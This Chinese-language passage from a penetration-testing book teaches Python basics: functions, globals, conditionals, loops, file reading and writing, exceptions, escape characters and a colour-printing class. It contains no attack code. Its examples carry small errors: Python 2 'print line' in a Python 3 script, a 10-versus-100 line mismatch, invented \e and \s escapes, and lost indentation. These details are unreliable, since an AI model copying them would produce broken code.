  \ Python 创建自动化工具，而本章将为你这一挑战做好准备。\n\n## 函数\n\n与变量一样，函数的创建是为了组织代码并避免冗余、错误和编程不良习惯。添加函数后，代码将看起来更具可读性和逻辑性。在\
  \ Python 中使用函数时，有一些重要的规则需要注意，但首先，让我们看看典型的函数结构是怎样的：\n\n```\n def function_name(parameters):\n\
  \ #逻辑写在这里\n return [value/None]\n```\n\n根据之前的结构，在 Python 中创建函数的规则如下：\n\n- 在函数名之前，你必须添加\
  \ `def`（定义）关键字。\n- 如果你的函数接收参数，则必须在函数名后的括号中添加它们。\n- 在开始函数之前，你必须添加冒号（ `:` ）。\n- 函数内容必须缩进。\n\
  - 可选地，你可以添加 `return` 语句来告知函数已执行完毕。\n\n让我们通过创建一个简单的函数创建一个示例，该函数将打印我们发送给它的任何消息：\n\n\
  ```\n def print_text (text_val):\nprint (text_val)\nreturn\n```\n\n### 返回值\n\n在某些情况下，你希望函数返回某些值。例如，你想根据端口号返回服务名称：\n\
  \n```\n def get_serviceName (port_number):\n ports_services = {21:'FTP', 22:'SSH',\
  \ 80:'HTTP', 443:'HTTPS'}\n return ports_services[port_number]\n\nprint (get_serviceName(21))\n\
  ```\n\n### 可选参数\n\n如果没有传递值，你还可以通过赋予一个默认值来添加可选参数。我们将使用上一个例子，通过给出一个默认值 80 来使端口号参数变为可选：\n\
  \n```\n def get_serviceName (port_number=80):\n ports_services = {21:'FTP', 22:'SSH',\
  \ 80:'HTTP', 443:'HTTPS'}\n\n return ports_services[port_number]\n#由于端口参数是可选的，我将不输入值\n\
  print (get_serviceName())\n```\n\n## 全局变量\n\n全局变量位于 Python 脚本的外部作用域（例如，不在函数或循环中），通常定义在开头。展示其工作原理的最佳方法是通过一个示例：\n\
  \n```\n # 这是一个全局变量\ndefault_portNumber = 80\n\ndef print_portNumber() :\n #这是一个函数自身的局部变量\n\
  \ default_portNumber = 443\n return default_portNumber\n\nprint (\"The local variable\
  \ value: %d\" % print_portNumber())\nprint (\"The global variable value: %d\" %\
  \ default_portNumber)\n```\n\n运行之前的脚本将得到以下输出：\n\n```\n The local variable value:\
  \ 443\nThe global variable value: 80\n```\n\n### 修改全局变量\n\n如果你想从函数内部更改全局变量怎么办？如果是那样的话，你必须使用\
  \ `global` 语法：\n\n```\n # 这是一个全局变量\ndefault_portNumber = 80\n\ndef print_portNumber(port_number):\n\
  \ #这是一个可以改变全局变量值的局部变量\n global default_portNumber\n default_portNumber = port_number\n\
  \ return default_portNumber\n\nprint (\"The local variable value: %d\" % print_portNumber(443))\n\
  print (\"The global variable value: %d\" % default_portNumber)\n```\n\n这次我们得到了与之前示例不同的结果，因为我们在函数内部更改了全局变量的值：\n\
  \n```\n The local variable value: 443\nThe global variable value: 443\n```\n\n##\
  \ 条件\n\n条件通过 `if` 语句实现；它们将检查条件的布尔值结果以评估该条件。如果返回结果为 `True`，则满足条件；如果为 `False`，则条件不执行。定义看起来可能很复杂，但当你开始练习时，原理是非常直接的。这里有一个例子：\n\
  \n```\n def login (password):\n  if (password == \"MrRobot\"):\n    print (\"Welcome\
  \ to FSociety!\")\n\nsecret = input (\"Enter your password: \")\n#调用 login 函数\n\
  login(secret)\n```\n\n在输出窗口中显示如下：\n\n```\n Enter your password: MrRobot\nWelcome\
  \ to FSociety!\n```\n\n### if/else 语句\n\n在之前的示例中，你看到了如何用密码登录，但如果我们想在用户输入无效密码时显示另一个消息怎么办？在这种情况下，`if`\
  \ / `else` 语句将完成这项工作：\n\n```\n def login (password):\n if (password == \"MrRobot\"\
  ):\n print (\"Welcome to FSociety!\")\n else:\n print (\"Wrong Password Hacker!\"\
  )\n\nsecret = input (\"Enter your password: \")\nlogin(secret)\n```\n\n如果用户输入错误的密码，输出将如下：\n\
  \n```\n Enter your password: Gus\nWrong Password Hacker!\n```\n\n### 比较运算符\n\n在之前的条件示例中，我们使用了双等（`==`）比较运算符，但还有很多其他运算符。表\
  \ 17.4 列出了你在应用比较语句时需要使用的最常用的比较运算符。\n\n| 运算符 | 描述 | 示例 |\n| :--- | :--- | :--- |\n\
  | `==` | 检查右操作数和左操作数是否相等 | `>>> ftp_port == http_port` `False` |\n| `!=` | 检查右操作数是否不等于左操作数\
  \ | `>>> ftp_port != http_port` `True` |\n| `>` | 检查左操作数是否大于右操作数 | `>>> ftp_port\
  \ > http_port` `False` |\n| `>=` | 检查左操作数是否大于或等于右操作数 | `>>> ftp_port >= 21` `True`\
  \ |\n| `<` | 检查左操作数是否小于右操作数 | `>>> ftp_port < http_port` `True` |\n| `<=` | 检查左操作数是否小于或等于右操作数\
  \ | `>>> ftp_port <= 21` `True` |\n\n在表 17.4 的示例中，我们使用了两个整数变量：\n\n```\n ftp_port\
  \ = 21\nhttp_port = 80\n```\n\n## 循环迭代\n\n循环语句将多次迭代代码行直到满足条件。一个很好的例子是基于之前的 `if`\
  \ 语句；如果你想让用户在被锁定之前多次输入密码怎么办？有两种方法可以实现我们的目标。第一种是使用 `while` 循环语句，第二种是使用 `for` 循环语句。\n\
  \n### while 循环\n\n在这个示例中，我们将使用 `while` 循环让用户在我们将踢出系统之前输入三次密码：\n\n```\n def login\
  \ (password):\n if (password == \"MrRobot\"):\n print (\"Welcome to FSociety!\"\
  )\n else:\n print (\"Wrong Password Hacker!\")\n\nattempts = 0\nwhile (attempts\
  \ < 3):\n secret = input (\"Enter your password: \")\n login(secret)\n attempts\
  \ = attempts + 1\n\nif (attempts == 3):\n print(\"Maximum attempts has been made,\
  \ exiting …\")\n```\n\n输出如下：\n\n```\n Enter your password: attempt1\nWrong Password\
  \ Hacker!\nEnter your password: attempt2\nWrong Password Hacker!\nEnter your password:\
  \ attempt3\nWrong Password Hacker!\nMaximum attempts have been made, exiting …\n\
  ```\n\n### for 循环\n\n我们可以使用 `for` 循环来实现密码尝试的目标，这比 `while` 循环的概念更简单。（我几乎不使用 `while`\
  \ 循环；我通常用用 `for` 循环。）\n\n```\n def login (password):\n if (password == \"MrRobot\"\
  ):\n print (\"Welcome to FSociety!\")\n else:\n print (\"Wrong Password Hacker!\"\
  )\n\nfor attempt in range(0,3):\n secret = input (\"Enter your password: \")\n login(secret)\n\
  \ if (attempt == 2):\n print(\"Maximum attempts has been made, exiting …\")\n```\n\
  \n\n\n\n输出结果与上一个示例相同。请注意 `range(0,3)` 会在 `attempt` 变量中存储序列 0,1,2（而不是 1,2,3 或 0,1,2,3）。这就是为什么我使用条件\
  \ `if (attempt==2)` 来判断判断何时尝试次数达到了最大值。\n\n### 文件管理\n\n在 Python 中管理文件时，你有两种选择：\n\n\
  * 打开并读取（仅读）文件\n* 向文件中写入内容\n\n在 Python 中打开并读取文件需要你使用 `open` 函数并向其提供两个参数：\n\n* 文件路径\n\
  * 字母 `r`，表示我们正在使用只读模式\n\n在接下来的示例中，我们将打开一个字典文件并打印前 10 行项目：\n\n```\n #!/usr/bin/python3\n\
  import sys\n\ntry:\n open_file=open(\"/usr/share/wordlists/nmap.lst\",'r')\n print\
  \ (\"File opened successfully!\")\n\n count = 0\n for line in open_file:\n count\
  \ = count + 1\n print line\n if (count == 100):\n break\nexcept:\n print (\"cannot\
  \ open the file\")\n sys.exit(0)\n```\n\n要向 Python 文件写入内容，必须更改 `open` 定义中的字母 `r`\
  \ 并将其替换为字母 `a`（代表追加）：\n\n```\n #!/usr/bin/python3\n\ndef write_file(file_path,contents):\n\
  \ try:\n open_file = open(file_path,'a')\n open_file.write(contents)\n except Exception\
  \ as err:\n print (\"Error: %s\" % str(err))\n finally:\n return\n\n#调用函数\nwrite_file('/root/test.txt',\"\
  Hacking Test\\n\")\n```\n\n在在上一个示例中，你应该关注两个核心概念（你将在后续章节中详细学习）：\n\n* 异常处理\n* 转义字符，例如\
  \ `\\n`（换行）\n\n### 异常处理\n\n异常/错误处理将确保在错误发生时捕获它。当你想要使用错误处理时，必须使用以下模式：\n\n```\n try:\n\
  \ #你的代码在此处\nexcept [Exception Object Type] as [variable]:\n # 在这里，处理异常\nfinally:\n\
  \ # 添加一些在最后执行的逻辑\n```\n\n我们在上一个示例（`write_file` 函数）中使用了异常对象（`Exception as err`）。尽管如此，还有许多异常对象类型（注意你可以直接使用\
  \ `except` 关键字而无需声明异常对象类型，就像我们在打开和读取文件示例中所的那样）。作为渗透测试人员，你大多数时候都会使用异常对象类型。异常对象是处理所有类型异常（错误）的根类。\n\
  \n### 文本转义字符\n\n在写入文件的示例中，我们使用 `\\n` 在插入新文本后添加新行。我们添加这个转义字符是为了查看如何处理类似的情况。你可以使用多种转义字符选项（参见表\
  \ 17.5）。\n\n| 符号 | 描述 |\n| --- | --- |\n| `\\a` | 警报声 |\n| `\\b` | 退格 |\n| `\\e`\
  \ | 转义键 (Escape) |\n| `\\s` | 空格 |\n| `\\t` | 制表符 |\n| `\\n` | 换行 |\n| `\\r` | 回车\
  \ |\n\n表 17.5 Python 转义字符\n\n### Python 中的自定义对象\n\n创建对象或类是为了以更细粒度的方式组织源代码，以实现整洁的代码开发。上面的表述有点哲学化；别担心，在接下来的示例中，你很快就会理解什么是类（或对象）了。假设你正在用\
  \ Python 构建一个端口扫描器。一种良好的做法是创建一个处理所有标准功能的类（我们称之为工具类对象）。类对象对于大型源代码程序非常实用。我们不会在本章中涵盖所有的面向对象编程技术，因为作为渗透测试人员，你不需要这些（那是程序员准备的）。但你将需要以下术语：\n\
  \n* **成员 (Members):** 这些是在类内部创建的公共变量（例如在下一个示例中创建的文本成员）。\n* **方法 (Methods):** 这些是在类内部创建的公共函数（例如在下一个示例中开发的\
  \ `print_red` 方法）。\n* **构造函数 (Constructor):** 这是在类对象被创建（实例化）时被调用的主函数。\n* **实例化 (Instantiate):**\
  \ 这是当类对象在其作用域之外声明（例如在下一个示例中创建的 `prnt` 对象）。\n* **Self:** 这是类内部使用的一个关键字，用于表示它的实例。\n\
  \n一图胜于千言万语，让我们让我们从构建一个打印类对象开始，在实践中观察结果。以下类有两个方法（函数）：用于打印红色文本和用于打印绿色文本（想象一下这个类是多么灵活；你可以在开发的任何程序中复用它）：\n\
  \n```\n #!/usr/bin/python3\n\n# 我们在这里使用 class 关键字开始一个类\nclass PrintColor:\n # 局部类变量\n\
  \ red_color = \"\\033[91m {}\\033[00m\"\n green_color = \"\\033[92m {}\\033[00m\"\
  \n\n # 使用 __init__ 函数的类构造函数\n   #self 意味着类本身；我们总是需要将其作为第一个参数\n def __init__(self,text):\n\
  \ # text 是类的成员\n self.text = text\n\n # 暴露的函数被称为方法\n # 这个公共函数将打印红色文本\n def print_red(self):\n\
  \ print(self.red_color.format(self.text))\n\n # 这个函数将打印绿色文本\n def print_green(self):\n\
  \ print(self.green_color.format(self.text))\n\n# 在这里我们调用类，通过创建一个 prnt 对象来实例化它\n\
  prnt = PrintColor(\"要打印的文本\")\n# 调用打印绿色文本方法\nprnt.print_green()\n# 调用打印红色文本方法\n\
  prnt.print_red()\n```\n\n### 总结\n\n希望你喜欢并练习了本章。Python 是我自动化所有渗透测试场景的选择。在下一章中，你将看到如何采取...\n\
